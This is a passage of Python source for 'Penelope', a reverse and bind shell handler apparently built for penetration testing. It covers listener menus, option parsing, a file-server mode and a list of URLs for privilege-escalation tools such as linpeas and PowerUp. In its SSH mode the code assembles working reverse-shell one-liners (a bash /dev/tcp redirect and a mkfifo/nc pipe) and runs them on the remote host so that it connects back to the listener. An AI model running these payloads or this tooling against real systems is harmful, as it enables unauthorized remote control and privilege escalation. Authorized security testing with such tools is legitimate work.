			logger.error(e.reason)
			if (hasattr(ssl, 'SSLCertVerificationError') and type(e.reason) == ssl.SSLCertVerificationError) or\
				(isinstance(e.reason, ssl.SSLError) and "CERTIFICATE_VERIFY_FAILED" in str(e)):
				answer = ask("Cannot verify SSL Certificate. Download anyway? (y/N): ")
				if answer.lower() == 'y': # Trust the cert
					ctx = ssl._create_unverified_context()
					continue
			else:
				answer = ask("Connection error. Try again? (Y/n): ")
				if answer.lower() == 'n': # Trust the cert
					pass
				else:
					continue
		return None, None

	filename = response.headers.get_filename()
	if filename:
		filename = filename.strip('"')
	elif URL.split('/')[-1]:
		filename = URL.split('/')[-1]
	else:
		filename = URL.split('/')[-2]

	size = int(response.headers.get('Content-Length'))
	data = bytearray()
	pbar = PBar(size, caption=f" {paint('⤷').cyan} ", barlen=40, metric=Size)
	while True:
		try:
			chunk = response.read(options.network_buffer_size)
			if not chunk:
				break
			data.extend(chunk)
			pbar.update(len(chunk))
		except Exception as e:
			logger.error(e)
			pbar.terminate()
			break

	return filename, data

def check_urls():
	global URLS
	urls = URLS.values()
	space_num = len(max(urls, key=len))
	all_ok = True
	for url in urls:
		req = Request(url, method="HEAD", headers={'User-Agent': options.useragent})
		try:
			with urlopen(req, timeout=5) as response:
				status_code = response.getcode()
		except HTTPError as e:
			all_ok = False
			status_code = e.code
		except:
			return None
		if __name__ == '__main__':
			color = 'RED' if status_code >= 400 else 'GREEN'
			print(f"{paint(url).cyan}{paint('.').DIM * (space_num - len(url))} => {getattr(paint(status_code), color)}")
	return all_ok

def listener_menu():
	if not core.listeners:
		return False

	listener_menu.active = True
	func = lambda: _
	listener_menu.control_r, listener_menu.control_w = os.pipe()

	listener_menu.finishing = threading.Event()

	while True:
		tty.setraw(sys.stdin)
		stdout(
			f"\r\x1b[?25l{paint('➤ ').white} "
			f"🏠 {paint('Main Menu').green} (m) "
			f"💀 {paint('Payloads').magenta} (p) "
			f"🔄 {paint('Clear').yellow} (Ctrl-L) "
			f"🚫 {paint('Quit').red} (q/Ctrl-C)\r\n".encode()
		)

		r, _, _ = select([sys.stdin, listener_menu.control_r], [], [])

		if sys.stdin in r:
			command = sys.stdin.read(1).lower()
			if command == 'm':
				func = menu.show
				break
			elif command == 'p':
				termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
				print()
				for listener in core.listeners.values():
					print(listener.payloads, end='\n\n')
			elif command == '\x0C':
				os.system("clear")
			elif command in ('q', '\x03'):
				func = core.stop
				menu.stop = True
				break
			stdout(b"\x1b[1A")
			continue
		break

	termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
	stdout(b"\x1b[?25h\r")
	func()
	os.close(listener_menu.control_r)
	listener_menu.active = False
	listener_menu.finishing.set()
	return True

def play_sound(sound_name: str):
    if options.use_sounds:
        subprocess.run(["paplay"], input=base64.b64decode(SOUNDS[sound_name]))

def load_rc():
	RC = Path(options.basedir / "peneloperc")
	try:
		with open(RC, "r") as rc:
			exec(rc.read(), globals())
	except FileNotFoundError:
		RC.touch()
	os.chmod(RC, 0o600)

def load_modules():
    modules_dir = Path(options.basedir) / "modules"
    modules_dir.mkdir(exist_ok=True)

    if not modules_dir.exists():
        modules_dir.mkdir()

    for module in modules_dir.iterdir():
        if module.is_file() and module.suffix == ".py":
            try:
                with open(module, "r") as module_file:
                    exec(module_file.read(), globals())
            except Exception as e:
                print(f"Error loading module {module}: {e}")

def fonts_installed():

	if myOS == "Darwin":
		return True

	result = subprocess.run(
		["fc-list", ":charset=1f600"],  # 1F600 = smiling face
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE,
		text=True
	)
	return bool(result.stdout.strip())

# OPTIONS
class Options:
	log_levels = {"silent":'WARNING', "debug":'DEBUG'}

	def __init__(self):
		self.basedir = Path.home() / f'.{__program__}'
		self.default_listener_port = 4444
		self.default_bindshell_port = 5555
		self.default_fileserver_port = 8000
		self.default_interface = "0.0.0.0"
		self.payloads = False
		self.use_sounds = False
		self.no_log = False
		self.no_timestamps = False
		self.no_colored_timestamps = False
		self.max_maintain = 10
		self.maintain = 1
		self.single_session = False
		self.no_attach = False
		self.no_upgrade = False
		self.debug = False
		self.dev_mode = False
		self.latency = .01
		self.histlength = 2000
		self.long_timeout = 60
		self.short_timeout = 4
		self.max_open_files = 5
		self.verify_ssl_cert = True
		self.proxy = ''
		self.upload_chunk_size = 51200
		self.download_chunk_size = 1048576
		self.network_buffer_size = 16384
		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
		self.logfile = f"{__program__}.log"
		self.debug_logfile = "debug.log"
		self.cmd_histfile = 'cmd_history'
		self.debug_histfile = 'cmd_debug_history'
		self.useragent = "Wget/1.21.2"
		self.attach_lines = 20

	def __getattribute__(self, option):
		if option in ("logfile", "debug_logfile", "cmd_histfile", "debug_histfile"):
			return self.basedir / super().__getattribute__(option)
#		if option == "basedir":
#			return Path(super().__getattribute__(option))
		return super().__getattribute__(option)

	def __setattr__(self, option, value):
		show = logger.error if 'logger' in globals() else lambda x: print(paint(x).red)
		level = __class__.log_levels.get(option)

		if level:
			level = level if value else 'INFO'
			logging.getLogger(__program__).setLevel(getattr(logging, level))

		elif option == 'maintain':
			if value > self.max_maintain:
				show(f"Maintain value decreased to the max ({self.max_maintain})")
				value = self.max_maintain
			if value < 1:
				value = 1
			#if value == 1: show("Maintain value should be 2 or above")
			if value > 1 and self.single_session:
				show("Single Session mode disabled because Maintain is enabled")
				self.single_session = False

		elif option == 'single_session':
			if self.maintain > 1 and value:
				show("Single Session mode disabled because Maintain is enabled")
				value = False

		elif option == 'no_bins':
			if value is None:
				value = []
			elif type(value) is str:
				value = re.split('[^a-zA-Z0-9]+', value)

		elif option == 'proxy':
			if not value:
				os.environ.pop('http_proxy', '')
				os.environ.pop('https_proxy', '')
			else:
				os.environ['http_proxy'] = value
				os.environ['https_proxy'] = value

		elif option == 'basedir':
			value.mkdir(parents=True, exist_ok=True)

		if hasattr(self, option) and getattr(self, option) is not None:
			new_value_type = type(value).__name__
			orig_value_type = type(getattr(self, option)).__name__
			if new_value_type == orig_value_type:
				self.__dict__[option] = value
			else:
				show(f"Wrong value type for '{option}': Expect <{orig_value_type}>, not <{new_value_type}>")
		else:
			self.__dict__[option] = value

def main():

	## Command line options
	parser = ArgumentParser(description="Penelope Shell Handler", add_help=False,
		formatter_class=lambda prog: ArgumentDefaultsHelpFormatter(prog, width=150, max_help_position=40))

	parser.add_argument("-p", "--port", help=f"Port to listen/connect/serve, depending on -i/-c/-s options. \
		Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port}")
	parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell")

	method = parser.add_argument_group("Reverse or Bind shell?")
	method.add_argument("-i", "--interface", help="Interface or IP address to listen on. Default: 0.0.0.0", metavar='')
	method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')

	hints = parser.add_argument_group("Hints")
	hints.add_argument("-a", "--payloads", help="Show sample payloads for reverse shell based on the registered Listeners", action="store_true")
	hints.add_argument("-l", "--interfaces", help="Show the available network interfaces", action="store_true")
	hints.add_argument("-h", "--help", action="help", help="show this help message and exit")

	log = parser.add_argument_group("Session Logging")
	log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
	log.add_argument("-T", "--no-timestamps", help="Do not include timestamps in session logs", action="store_true")
	log.add_argument("-CT", "--no-colored-timestamps", help="Do not color timestamps in session logs", action="store_true")

	misc = parser.add_argument_group("Misc")
	misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, metavar='')
	misc.add_argument("-M", "--menu", help="Just land to the Main Menu", action="store_true")
	misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
	misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
	misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")
	misc.add_argument("-ss", "--use-sounds", help="Make a sound when a revshell is received")

	misc = parser.add_argument_group("File server")
	misc.add_argument("-s", "--serve", help="HTTP File Server mode", action="store_true")
	misc.add_argument("-prefix", "--url-prefix", help="URL prefix", type=str, metavar='')

	debug = parser.add_argument_group("Debug")
	debug.add_argument("-N", "--no-bins", help="Simulate binary absence on target (comma separated list)", metavar='')
	debug.add_argument("-v", "--version", help="Show Penelope version", action="store_true")
	debug.add_argument("-d", "--debug", help="Show debug messages", action="store_true")
	debug.add_argument("-dd", "--dev-mode", help="Developer mode", action="store_true")
	debug.add_argument("-cu", "--check-urls", help="Check health of hardcoded URLs", action="store_true")

	parser.parse_args(None, options)

	# Modify objects for testing
	if options.dev_mode:
		logger.critical("(!) THIS IS DEVELOPER MODE (!)")
		#stdout_handler.addFilter(lambda record: True if record.levelno != logging.DEBUG else False)
		#logger.setLevel('DEBUG')
		#options.max_maintain = 50
		#options.no_bins = 'python,python3,script'

	sounds_compatible = False
	if options.use_sounds:
		# Check if sounds available
		if platform.system().lower() == "linux" and shutil.which("paplay") is not None:
			# Its linux and there is paplay command
			sounds_compatible = True

		if not sounds_compatible:
			options.use_sounds = False
			print("Can't use sounds, make sure you have pulseaudio-utils installed (just linux for now)")


	global keyboard_interrupt
	signal.signal(signal.SIGINT, lambda num, stack: core.stop())

	# Show Version
	if options.version:
		print(__version__)

	# Show Interfaces
	elif options.interfaces:
		print(Interfaces())

	# Check hardcoded URLs
	elif options.check_urls:
		signal.signal(signal.SIGINT, signal.SIG_DFL)
		check_urls()

	# Main Menu
	elif options.menu:
		signal.signal(signal.SIGINT, keyboard_interrupt)
		menu.show()
		menu.start()

	# File Server
	elif options.serve:
		server = FileServer(*options.args or '.', port=options.port, host=options.interface, url_prefix=options.url_prefix)
		if server.filemap:
			server.start()
		else:
			logger.error("No files to serve")

	# Reverse shell via SSH
	elif options.args and options.args[0] == "ssh":
		if len(options.args) > 1:
			TCPListener(host=options.interface, port=options.port)
			options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={options.port or options.default_listener_port};"
				f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
				f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
			)
		try:
			if subprocess.run(options.args).returncode == 0:
				logger.info("SSH command executed!")
				menu.start()
			else:
				core.stop()
				sys.exit(1)
		except Exception as e:
			logger.error(e)

	# Bind shell
	elif options.connect:
		if not Connect(options.connect, options.port or options.default_bindshell_port):
			sys.exit(1)
		menu.start()

	# Reverse Listener
	else:
		TCPListener(host=options.interface, port=options.port)
		if not core.listeners:
			sys.exit(1)

		listener_menu()
		signal.signal(signal.SIGINT, keyboard_interrupt)
		menu.start()

#################### PROGRAM LOGIC ####################

# Check Python version
if not sys.version_info >= (3, 6):
	print("(!) Penelope requires Python version 3.6 or higher (!)")
	sys.exit(1)

# Apply default options
options = Options()

# Loggers
## Add TRACE logging level
TRACE_LEVEL_NUM = 25
logging.addLevelName(TRACE_LEVEL_NUM, "TRACE")
logging.TRACE = TRACE_LEVEL_NUM
def trace(self, message, *args, **kwargs):
    if self.isEnabledFor(TRACE_LEVEL_NUM):
        self._log(TRACE_LEVEL_NUM, message, args, **kwargs)
logging.Logger.trace = trace

## Setup Logging Handlers
stdout_handler = logging.StreamHandler()
stdout_handler.setFormatter(CustomFormatter())
stdout_handler.terminator = ''

file_handler = logging.FileHandler(options.logfile)
file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
file_handler.setLevel('INFO') # ??? TODO
file_handler.terminator = ''

debug_file_handler = logging.FileHandler(options.debug_logfile)
debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)
debug_file_handler.terminator = ''

## Initialize Loggers
logger = logging.getLogger(__program__)
logger.addHandler(stdout_handler)
logger.addHandler(file_handler)
logger.addHandler(debug_file_handler)

cmdlogger = logging.getLogger(f"{__program__}_cmd")
cmdlogger.setLevel(logging.INFO)
cmdlogger.addHandler(stdout_handler)

# Set constants
myOS = platform.system()
TTY_NORMAL = termios.tcgetattr(sys.stdin)
DISPLAY = 'DISPLAY' in os.environ
TERMINALS = [
	'gnome-terminal', 'mate-terminal', 'qterminal', 'terminator', 'alacritty', 'kitty', 'tilix',
	'konsole', 'xfce4-terminal', 'lxterminal', 'urxvt', 'st', 'xterm', 'eterm', 'x-terminal-emulator'
]
TERMINAL = next((term for term in TERMINALS if shutil.which(term)), None)
MAX_CMD_PROMPT_LEN = 335
LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
URLS = {
	'linpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
	'winpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat",
	'socat':        "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat",
	'ncat':         "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat",
	'lse':          "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
	'powerup':      "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1",
	'deepce':       "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh",
	'privesccheck': "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1",
	'les':          "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh",
	'ngrok_linux':  "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
	'uac_linux':  	"https://github.com/tclahr/uac/releases/download/v3.1.0/uac-3.1.0.tar.gz",
	'linux_procmemdump':  	"https://raw.githubusercontent.com/tclahr/uac/refs/heads/main/bin/linux/linux_procmemdump.sh",
}
SOUNDS = {
    'success': """
    //vQZAAP8AAAaQAAAAgAAA0gAAABAAABpBQAACAAADSCgAAETEFNRTMuMTAwVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVABAAAA8uju8LgG55uXPImZ/m4n4UT/EExJxXQsr/8EIFAiJgMjB4DHgaAwKPf/wMjhkDKInAwEPAMhBQAJwANGP//Ax8JgMFDoDAyBA2ecQNqmMDISeA0kOv//wNjFwDHKNA0CMQNSkkDFBgAycFANQBADJYTAyALP///AwoCgaA8DDoDAGD4CAoBhoAABBwDB5LAy6JwMCBMDB44/////AzoPANLBoDJI9BAAgGBGFwhZIuHEBaYLAKTFLhzxQH////////+dNiZHGPZBE1GJEyLjUFKDAJcXAQAAAAB48R5ePAHZ6Q5PGgI7/E5kDFO/wuoC5gOuFp//gCgECoIAw4BAMSBgEg//+BjMIgZPFIAg4AyEFgMrCADA4j//wFBWBj0ShMVAY8CwGXhUBgMYgYvBP//4GSySBgEwAaUJQGuiABkk6gZNBoGdxKBiolAYyAn///gZEAQGIRaA0JwGjUAcTAMQhMDDY7AxCMAM3DgDXwkAymI/////wMcCoCQlAwyDxcwfgHKgKAMBQLgOAAW8AiBAXPlgb47P////////8i5wjRcYwxchqVSuThLE0MwXDpPiuZvK2bC7bHYbDYbC4f82X3oRGnug573tKCocPLdy4nm0/edPXT4p/n6RWNYaUthkNflPb+1IXao4fhiNsilEszdhYQv4mwhP/70kT/gAbRijMuNqAE3NFGRcbUAKuiHze5jYAFdcMmNzOwACRDwjFMcmnfJmSPPBbBy+D8A4sEkEGlByCUZGTjoQ2J4RGMqWuKy28w9ykfASAmDg4cBgpEHAszEIDjczAJNIdDdjS7IXZXaxoZJkmUFFAFLA4DeNOsxoGVRRzNPGRwuUEMlIDQB41YUM7YzEhkx0Aclhr8vgsDKZ9nMJKBcHADOxYDS8eRdAqCg4XaamGYqUGzhJ7VUZ2EJ5gZoMDADJB8wRQPeMhIdjqlBjAmpTDMORuaeAdJw68nwUGQdbcetYyjFjDD6foNJTG0EuGokZCEmMhYYFteSHfVC9PdccMQ+irXlLSaarS441fxx////////////////////z/fcqTC3/9z/W/////////x/v/JLt//vyU0uEouf7/v6/H5/G4mGF2NGD24QwzL7R/kppGoIgLsZoc5ID12T8rqDumiJNT+NO15FiGXkicbtyiGJZG2HR+H41i/kBw/Db9oKLsdwGAAKLBADqXVKAVBYccJghiYK20UMGBjBABVYFHA1bAaEBxYWuiTwjo27L62U+Ecy+4OE1bAADBgQakPBz8IVUxEgMWODGEQedcmRu9GMEJgQApruhITRBxeMaBQvGsQ6WMEITOXc1oVPArAEOEJIDhAIKW7LDMSYQWVXTAEPPEu1ZxfBMByGmKDu/D5mw4niYamhyuezUhFKrIhqBhsxklMLTzti03w6yXiDA5ypd2u0leIFCmEz/K8vr28IvUsSz/wxNAAgAAGChojAhocBAQzsvU4SlqVMSctnSVLeqt+pQ41aamptfjrve/////////////////9zPLuFPrDP//7n/////////3eP/BM7eyzlZIQhhcwLJAgANS0umFAUMOgkUxLAjGSggFkDCEizlKJjG4BAALZguSZjmA7RjDcPDFwKCIFBUzOhVxoDAAU2bssRkU0fyBcJ1Uo8JQ0hMbWAXgT47RyDtPE5Z379yedNNSl3zWt37mU9MS2MsBBAqBAaXrEgentxaQQxynmsmeIPyupzv7hmOWLkqSqBJ0TJrOaXk/R7wr5Tss7HJWFiBw4zL5NUrXZTd7q1Eob//vSRFaACE51zH93YAEHD2lt7ewAGTG/N+3mb8Lyq+f9vE54n6XC0+ztA0SDmt2n5jcUsvXZvWeZY56rUzfs1srITOHCQ4wfAwyu2BZiSX5Bl/73xvLtNTTtPlc7Tctd/P/x+5znOfl/f/v////Of//////+Vyi3Q5f////qc6p3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